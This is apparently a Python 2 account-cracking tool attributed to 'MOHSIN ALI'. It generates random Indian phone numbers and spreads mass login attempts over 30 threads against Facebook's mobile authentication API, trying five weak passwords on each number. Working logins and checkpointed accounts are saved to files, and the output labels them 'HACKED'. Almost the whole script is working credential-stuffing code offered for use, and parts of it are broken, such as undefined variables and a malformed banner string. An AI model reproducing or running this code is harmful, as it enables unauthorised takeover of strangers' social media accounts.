# Ustad# SIDRA5# Thuglife# MOHSIN ALI# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(9900):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print  nmbr

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .MOHSIN.py')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def lodhirt():
    lodhirt = [
     'AM', '   ', 'AM', '  ', 'SHOW MAN\n']
    for o in lodhirt:
        print '\r\x1b[1;94m\x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
def jalan(x):
	for e in x + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
    titik = [
     '   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
    for o in titik:
        print '\r\x1b[1;97m \x1b[1;91m               Load\x1b[1;92ming\033[1;0m\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
        


os.system("clear")
logo = """
 \033[0;33m⚚═╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌═⚚
\033[1;33m███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
\033[1;91m████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
\033[1;97m███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;33m████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;91m███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
\033[1;97m████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
\033[1;91m███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;97m████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;33m███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;91m█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
\033[1;97m█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
\033[1;33m█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
\033[1;91m████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
\033[1;97m████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
\033[1;33m█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
\033[1;91m█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
\033[1;97m██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
\033[1;33m███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
\033[1;91m███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
\033[1;97m████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
\033[1;33m█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
\033[1;91m██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
\033[1;97m███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
\033[1;33m██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
\033[1;91m███████████████▓▓▓██▓▓╬╬╬╬╬╬▓██████████.  ..__..  . __.._..  .  .__..   ._.
 |\/||  ||__|(__  | |\ |  [__]|    |
 |  ||__||  |.__)_|_| \|  |  ||____|_
logo1 = """

\033[1;97m===============================================
\033[1;92m☣CREATER :  MOHSIN ALI჻
\033[1;96m☣WHATAAP : 03063112***჻
\033[1;91m☣FACEBOOK:MOHSIN.ALI.THE.FATHER.OF.HATERX ჻
\033[1;95m☣FRIEND YT: TAIMUR CREATION ჻
\033[1;94m☣NOTE Always remember you are unique, 
 just like everyone Written by Mohsin ALI჻
\033[1;97m===============================================
\033[1;93m☀NOTE DON'T TRY TO MISS USE 🙂 ჻
\033[1;97m===============================================
                                                             

"""
logo2 = """
##     ##  #######  ##     ##  ######  #### ##    ##       ###    ##       ####
###   ### ##     ## ##     ## ##    ##  ##  ###   ##      ## ##   ##        ##
#### #### ##     ## ##     ## ##        ##  ####  ##     ##   ##  ##        ##
## ### ## ##     ## #########  ######   ##  ## ## ##    ##     ## ##        ##
##     ## ##     ## ##     ##       ##  ##  ##  ####    ######### ##        ##
##     ## ##     ## ##     ## ##    ##  ##  ##   ###    ##     ## ##        ##
##     ##  #######  ##     ##  ######  #### ##    ##    ##     ## ######## ####


"""
logo3 = """                              
\033[1;91m
TYPE ANY PHONE NUMBER CODE
\033[1;96m
\033[1;97m[1] INDIA\033[1;93m 905,975,755,855,954,
\033[1;97m[2] INDIA\033[1;95m 897, 967, 937, 700, ???
\033[1;97m[3] INDIA\033[1;92m 727, 965, 786, 874, 856
\033[1;97m[4] INDIA\033[1;96m 566, 590, 527, 568, 578

"""

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
def menu():
    os.system('clear')
    print logo2
    print 47* '\033[1;97m⁃'
    print
    jalan('\033[1;91m (\033[1;92m1\033[1;91m)\033[1;93m INDIAN LOCK PROFILE IDS CLONE')
    print
    jalan('\033[1;91m (\033[1;92m0\033[1;91m)\033[1;96m CLOSE PROGRAM')
    print
    print 47* '\033[1;97m⁃'
    action()


def action():
    global cpb
    global oks
    somi = raw_input('\n\n \x1b[1;90m ►')
    if somi == '':
        print '[!] Warning'
        action()
    
    elif somi == '1':
        tik()
        os.system('clear')
        print logo2
        print logo3
        try:
            c = raw_input('►')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()                    
    
    elif somi == '0':            
    	exb()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    
    print 47* '\033[1;97m⁃'
    xxx = str(len(id))
    jalan('\033[1;93mTOTAL IDS NUMBER : '+xxx)
    time.sleep(0.5)
    jalan('\033[1;94mTOTAL PASSWORD : 5')
    time.sleep(0.5)
    jalan('\033[1;95mPLEASE WAIT')
    time.sleep(0.5)
    jalan('\033[1;96mSTOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    jalan('\033[1;93m--------------- MOHSIN ------------------------')
    time.sleep(0.5)
    jalan('\033[1;94m-------------------- ALI --------------------')
    print 47* '\033[1;97m⁃'
            
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Open \x1b[1;96mNow  )  ' + k + c + user + ' → ' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar \x1b[1;91m7days) ' + k + c + user + ' → ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user +  ' → ' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar \x1b[1;91m7days) ' + k + c + user + ' → ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="786786786"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' → '+ pass3
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Aftar \x1b[1;91m7days) ' + k + c + user + ' → ' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="786786"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' → ' + pass4 
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Aftar \x1b[1;91m7days) ' + k + c + user + ' → ' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="123456"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Open \x1b[1;96mNow)  ' + k + c + user + ' → ' + pass5
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Aftar \x1b[1;91m7days) ' + k + c + user + ' → ' + pass5 
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                          
                                                                                                                                                                                                                    
                                                                                                                                                                                                            

                                                                                                                                                                                                                                                                                 
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/login.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    print 'MOHSIN ALI THE BRAND'
    print ''
    print """
    """
    
    raw_input("\n\033[1;92m[\033[1;92mEXIT\033[1;92m]")
    menu() 
          
if __name__ == '__main__':
    menu()
           
          
           
